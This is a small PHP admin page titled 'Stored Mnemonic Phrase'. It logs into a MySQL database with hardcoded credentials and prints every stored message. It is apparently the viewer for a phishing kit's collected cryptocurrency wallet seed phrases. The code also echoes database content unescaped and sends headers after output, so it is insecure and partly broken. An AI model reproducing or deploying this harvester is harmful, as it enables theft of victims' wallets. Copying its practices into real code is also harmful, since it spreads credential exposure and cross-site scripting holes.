<!DOCTYPE html>
<html>
<head>
    <title>Admin Page </title>
</head>
<body>
    <h1>Stored Mnemonic Phrase:</h1>
    <?php
    
    session_start();

    if (!isset($_SESSION['admin_logged_in'])) {
        
        header("Location: login.php");
        exit();
    }
    $host = "localhost";
    $username = "smm";
    $password = "2233445566";
    $database = "messages_db";

   
    $connection = new mysqli($host, $username, $password, $database);

   
    if ($connection->connect_error) {
        die("Connection failed: " . $connection->connect_error);
    }


    $sql = "SELECT * FROM messages_table";

   
    $result = $connection->query($sql);

    
    if ($result->num_rows > 0) {
       
        while ($row = $result->fetch_assoc()) {
            echo "<p>" . $row['message'] . "</p>";
        }
    } else {
        echo "No messages found.";
    }

   
    $connection->close();
    ?>
</body>
</html>
